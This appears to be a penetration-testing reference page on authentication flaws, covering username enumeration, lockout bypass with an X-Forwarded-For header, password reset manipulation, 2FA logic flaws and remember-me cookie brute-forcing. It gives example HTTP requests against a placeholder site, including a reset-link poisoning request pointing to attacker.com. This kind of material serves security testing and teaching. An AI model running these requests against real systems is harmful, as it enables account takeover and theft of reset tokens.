---
title: "Authentication"
weight: 2
description: "Explore key authentication testing techniques like username enumeration, password reset flaws, 2FA bypasses, and account lockout analysis."
---

# Authentication

## Username Enumeration

Finding valid usernames is the first step in many attacks. Test every feature interacting with user accounts (e.g., login, registration, password recovery).

{{< details summary="Common Default Usernames" >}}
Default usernames to test:

```sh
admin
administrator
root
firstname.lastname@somecompany.com
test
guest
```
{{< /details >}}

### Registration Form

If the application states "Account already exists" when registering a known email, it leaks user existence. 

### Response Comparison

Compare server responses when entering:
- A valid username with incorrect passwords
- An invalid username with incorrect passwords

Even minor differences in error messages can reveal valid usernames.

{{< hint style=tips >}}
**Tip**: Use Burp Suite's "Grep - Match" feature in Intruder to detect response variations.
{{< /hint >}}

### Response Timing Analysis

Some systems check passwords only if the username is valid. Sending an excessively long password may create a delay, indicating the username exists.

## Password Attacks

[Cracking passwords]({{< ref "misc/password-cracking" >}}) is a key part of authentication testing.


## Account Locking Mechanisms

Check if accounts lock after multiple failed attempts (e.g., 3 or 5 attempts). Understand the lockout mechanism:

- **Testing Responses**: Attempt logins with an incorrect password on a locked account, then with the correct password. If responses differ, the lock might be bypassable.
- **IP-Based Lockout**: The failed attempts counter resets if the IP owner logs in successfully. (Make sure that concurrent requests is set to 1)
Try bypassing with an `X-Forwarded-For` header.


## Password Reset Vulnerabilities

### Controlling the Username Parameter

If the reset request contains a `username` parameter, test if it can be changed:

```http
POST /forgot-password HTTP/2
Host: vulnerable-website.com

user=<victim>&new-pwd=NewPass123&token=xyz
```

### Predictable Password Reset URLs

Some sites use static or weakly random reset links. Test if a simple enumeration allows taking over accounts.

```http
http://vulnerable-website.com/reset-password?user=victim-user
```

### Hijacking Password Reset Links

Try injecting an `X-Forwarded-Host` header to change the reset link destination:

```http
POST /forgot-password HTTP/2
Host: vulnerable-website.com
X-Forwarded-Host: attacker.com

username=victim
```

## Two-Factor Authentication (2FA) Bypasses

### Brute-Forcing OTP

If the OTP code is short (e.g., 4-6 digits), brute-force it.

### Skipping 2FA Steps

Check if you can directly access logged-in pages without completing 2FA.

### Exploiting 2FA Logic Flaws
```http
# Step 1: Login with attacker account
POST /login HTTP/1.1
Host: vulnerable-website.com

username=attacker&password=qwerty
```

```http
# Step 2: Server sets a session cookie
HTTP/1.1 200 OK
Set-Cookie: session=attacker
```

```http
# Step 3: Request 2FA page with attacker's session
GET /login-steps/second HTTP/1.1
Cookie: session=attacker
```

```http
# Step 4: Submit the attacker's OTP using the victim's session
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: session=victim

verification-code=123456
```


## "Remember Me" Cookie Attacks

- Study how "Remember Me" cookies are generated (e.g., Base64 encoding or hashed values).
- Attempt brute-forcing attack.

## Password change

See if you can change the password of an arbitrary user. 
- Look for a hidden username parameter that you can control.
- Brute-force password when you enter your current password.
- Test all current & new password combinations.

```md
current password: <wrong>, new-password-1=XXX, new-password-2=XXX
current password: <wrong>, new-password-1=XXX, new-password-2=YYY
current password: <correct>, new-password-1=XXX, new-password-2=XXX
current password: <correct>, new-password-1=XXX, new-password-2=YYY
```